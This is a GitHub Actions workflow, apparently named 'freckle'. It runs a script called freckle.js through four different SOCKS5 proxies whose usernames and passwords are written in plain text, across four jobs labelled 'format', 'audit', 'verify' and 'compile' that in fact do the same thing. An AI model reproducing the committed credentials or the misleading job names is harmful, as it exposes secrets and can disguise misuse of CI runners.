name: freckle
on:
  push:
    branches: [ "main" ]
    paths:
      - '.github/workflows/freckle.yml'
      - 'freckle.js'
      - 'package.json'

jobs:
  format_ubuntu2404_node_verve:
    runs-on: ubuntu-24.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 22
        - name: Run Task
          run: |
            npm install && node freckle.js "socks5://dcswarup:webshare@103.53.216.179:5263" || true

  audit_windowslatest_node_bar:
    runs-on: windows-latest
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 20
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node freckle.js "socks5://dcswarup:webshare@46.203.157.29:6972"

  verify_ubuntu2204_bun_vestment:
    runs-on: ubuntu-22.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Bun
          uses: oven-sh/setup-bun@v2
          with:
            bun-version: latest
        - name: Run Task
          run: |
            bun install && bun run freckle.js "socks5://dcswarup:webshare@85.198.46.154:6422" || true

  compile_windows2022_node_blowgun:
    runs-on: windows-2022
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 24
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node freckle.js "socks5://dcswarup:webshare@46.203.210.72:5519"
